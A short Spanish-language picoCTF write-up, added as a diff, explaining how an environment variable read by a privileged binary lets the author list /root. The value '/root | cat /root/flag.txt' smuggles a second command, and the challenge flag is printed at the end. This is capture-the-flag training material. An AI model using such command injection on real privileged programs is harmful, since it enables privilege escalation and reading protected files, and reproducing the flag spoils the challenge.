@@ -1,0 +1,23 @@
+Okey nos conectamos por medio de ssh con lo valores que nos dan.
+
+Entramos y encontramos un bin
+
+* LO ejecutamos y nos dice que no existe la variable de entorno SECRET_DIR
+
+Le ponemos a la variable de entorno:
+
+export SECRET_DIR=/root
+
+Y volvemos a ejecutar y no lista lo que hay en la carpeta root
+
+* Esta el flag, falta poner la copia de lo que hay
+
+Entonces por la pista e intuicion intentamos poner mas comando de la siguiente forma
+
+export SECRET_DIR="/root | cat /root/flag.txt"
+
+Ejecutamos de nuevo el bin y se imprime el flag:
+
+./bin 
+Listing the content of /root | cat /root/flag.txt as root: 
+picoCTF{Power_t0_man!pul4t3_3nv_19a6873b}
